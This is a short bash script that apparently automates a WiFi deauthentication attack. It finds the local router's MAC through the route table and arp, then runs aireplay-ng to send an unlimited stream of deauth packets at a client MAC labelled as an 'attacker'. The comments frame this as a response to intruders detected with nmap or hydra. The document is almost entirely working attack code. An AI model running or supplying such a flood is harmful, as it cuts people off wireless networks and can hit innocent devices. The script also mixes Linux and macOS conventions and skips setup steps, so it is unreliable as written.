# Script to automate sending deauth packets

# First get router MAC Address on any local network
cmd1=($(ip route | grep default))
IPAddr=${cmd1[2]}
cmd2=($(arp -a | grep $IPAddr))
MACAddr=${cmd2[3]}
echo $MACAddr

# Use router MAC to send deauth packets 

# Have attacker MAC address from the nmap/hydra detection prepared to deauth to an individual
attackerMAC="00:00:00:00:00:00"

# perhaps also allow more customization of deauthing
# aireplay-ng [deauth code][# of deauths]-a[router MAC]-c[Attacker MAC][interface name]
echo $(aireplay-ng -0 0 -a $MACAddr -c $attackerMAC en0)
